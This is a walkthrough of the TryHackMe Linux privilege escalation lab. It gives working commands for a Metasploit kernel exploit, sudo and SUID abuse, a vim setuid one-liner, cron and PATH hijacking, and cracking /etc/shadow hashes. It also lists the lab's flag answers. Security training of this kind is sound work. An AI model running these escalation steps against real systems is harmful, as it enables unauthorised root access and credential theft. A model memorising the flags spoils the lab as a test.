# [Linux Privilege Escalation - TryHackMe](https://tryhackme.com/room/linprivesc) | Cya-nyde

Learn the fundamentals of Linux privilege escalation. From enumeration to exploitation, get hands-on with over 8 different privilege escalation techniques.

## Credits

- Room created by [tryhackme](https://tryhackme.com/p/tryhackme) and [1337rce](https://tryhackme.com/p/1337rce)
- Room type: Free

## Enumeration

**Low-priv credentials for box:**

- Username: karen
- Password: Password1

### What is the hostname of the target system?

> `uname -a` returns us <code>Linux **wade7363** 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</code>

### What is the Linux kernel version of the target system?

> Our `uname -a` command also gave us **Linux 3.13.0-24-generic**

### What Linux is this?

> `cat /etc/issue` to see <code>**Ubuntu 14.04** LTS \n \l</code>

### What version of Python language is installed on the system?

> `python --version` returns **Python 2.7.6**

### What vulnerability seem to affect the kernel of the target system?

> A quick google search of our kernel version *Linux 3.13.0* give us **CVE-2015-1328**

## Kernel Exploits

- `msfconsole` to open MetaSploit and `use scanner/ssh/ssh_login`
- Set all options appropriately including the provided credentials
- `exploit` the target and it should give you a backgrounded SSH session
- `search CVE-2015-1328` to find the module for our kernel exploit
- Set options appropriately - **be sure to use your VPN IP** for LOCALHOST
- `exploit` target to get root on the system

### What is the content of the flag1.txt file?

- Use `locate flag1.txt` to find the flag

> <details><summary><code>cat /home/matt/flag1.txt</code> gives us </summary>THM-28392872729920</details>

## Sudo

### How many programs can the user "karen" run on the target system with sudo rights?

> `sudo -l` gives us **3** binaries that the user *karen* is allowed to run as sudo on the machine

- /usr/bin/find
- /usr/bin/less
- /usr/bin/nano

### What is the content of the flag2.txt file?

- Use GTFObins on each of these binaries to try and escalate privileges
    - Try nano first, since it lets you directly edit text
    - Let's see if we can use nano to add ourselves as a sudoer
    - Since we have sudo access to nano, we can `sudo nano /etc/sudoers` and add the line `karen ALL=(ALL:ALL) ALL` to give ourselves root access on the machine
- After gaining root, `find / -name flag2.txt` shows us where flag2 is located

> <details><summary><code>cat /home/ubuntu/flag2.txt</code> to get </summary>THM-402028394</details>

### How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?

GTFObins has a one-liner that allows you to run commands in nmap as sudo (if you have rights to run the script as sudo):

> `sudo namp --interactive`

### What is the hash of frank's password?

- As root, we can `cat /etc/shadow` to show us the password hashes of every user

> Frank's hash is: `$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1`

## SUID

### Which user shares the name of a great comic book writer?

- The user karen is allowed to cat `/etc/passwd`, showing a list of users

> The user that immediately stands out is **gerryconway**.

### What is the password of user2?

- Used `find / -type f -perm -04000 -ls 2>/dev/null`, to get a list of binaries with SUID bits set
- Out of the ones listed, many are stored in the /snap directory, which will likely not be useful
    - `/usr/bin/base64` is the only binary that has a SUID bit set and is not in a snap directory that has a listing in GTFOBins for an SUID bit
- Used base64 to encode then decode /etc/shadow
    - `base64 /etc/shadow | base64 --decode`
    - We get this password hash for user2: `$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/`
- To use `unshadow`, we need both *passwd* and *shadow*
    - `unshadow` does not exist on target machine, and no sudo permissions to install
    - We need to get `/etc/passwd` and `/etc/shadow` to our attack machine
        - We can copy the contents of each after using `cat` and/or our base64 SUID exploit and `echo` them into files on our attack machine
            - `echo '*/etc/passwd contents*' > passwd`
            - `echo '*/etc/shadow contents*' > shadow`
    - `unshadow passwd shadow > hash.txt` to output the hashes into *hash.txt*
- *hash.txt* can now be cracked by **johntheripper**
- `john hash.txt --wordlist=*path-to-wordlist*` (rockyou.txt worked for me)

> The cracked password we find is **Password1**

### What is the content of the flag3.txt file?

- `cd /home/ubuntu`
- `base64 flag3.txt | base64 --decode`

> <details><summary>The flag found is </summary>THM-3847834</details>

## Capabilities

### How many binaries have set capabilities?

- Ran `getcap -r / 2>/dev/null` to list capabilities
    - *-r* flag enables command recursively so it will look within the subfolders of the '/' directory
    - Without root access, `getcap -r /` generates errors
    - *2>/dev/null* redirects errors to *null*

#### Output:

```
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/home/karen/vim = cap_setuid+ep
/home/ubuntu/view = cap_setuid+ep
```

> The output returns **6** binaries

### What other binary can be used through its capabilities?

> Cross-referencing against the list of binaries on [GTFOBins](https://gtfobins.github.io/gtfobins/vim/), vim and **view** can be used through their capabilities

### What is the content of the flag4.txt file?

- Use `./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'` to escalate privileges to root
- `find / -name "flag4.txt"`

> <details><summary><code>cat /home/ubuntu/flag4.txt</code> returns </summary>THM-9349843</details>

## Cron Jobs

`cat /etc/crontab` returns:

```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * *  root /antivirus.sh
* * * * *  root antivirus.sh
* * * * *  root /home/karen/backup.sh
* * * * *  root /tmp/test.py
```

### How many user-defined cron jobs can you see on the target system?

> There are **4** cron jobs listed on the target system

### What is the content of the flag5.txt file?

- `/home/karen/backup.sh` is accessible by our user and runs every minute
- Edit `backup.sh` and add a reverse shell
    - Some examples can be found [here](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- Open a listener on attack machine - `nc -lvnp *port*`
- Once reverse shell as root reaches out to your attack machine, `find / -name "flag5.txt"`

 > <details><summary><code>cat /home/ubuntu/flag5.txt</code> returns </summary>THM-383000283</details>

 ### What is Matt's password?

 - As root, `cat /etc/shadow` to get hashes and `cat /etc/passwd` to get user list
 - After getting files to attack machine, use `unshadow` to get crackable hashes
 
 > `john *unshadow output*` gives us **123456** as matt's password

 ## PATH

 - `echo $PATH` to show path variable
 - Show folders karen can write to with `find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`
    - `2>/dev/null` discards errors to null
    - `cut -d "/" -f 2,3` sets "/" as the delimiter and returns only the second and third fields
    - `grep -v proc` excludes results related to running processes
    - `sort -u` cuts out duplicates

### What is the odd folder you have write access for?

> karen has write access to **<code>/home/murdoch</code>**

### What is the content of the flag6.txt file?

- `/home/murdoch` contains `test` and `thm.py`
    - Running `./test` shows that the script is dependent on a file named "thm" which does not exist
- `vim thm` to create and edit the required file
    - The goal is to find a view the contents of `flag6.txt`
    - Write this simple script within `./thm`:
```
#!/bin/bash

loc=$(find / -name "flag6.txt" 2>/dev/null)
cat $loc
```

- `./test` should call the script within `/home/murdoch` which calls `./thm` with elevated permissions

 > <details><summary>This chain returns </summary>THM-736628929</details>

 ## NFS

 ### How many mountable shares can you identify on the target system?

 - `cat /etc/exports` to read NFS configuration

 > There are **3** mountable shares in the NFS configuration

 ### How many Shares have the "no_root_squash" option enabled?

 > Out of the 3 shares listed in the NFS configuration file, all **3** have the no_root_squash option enabled

 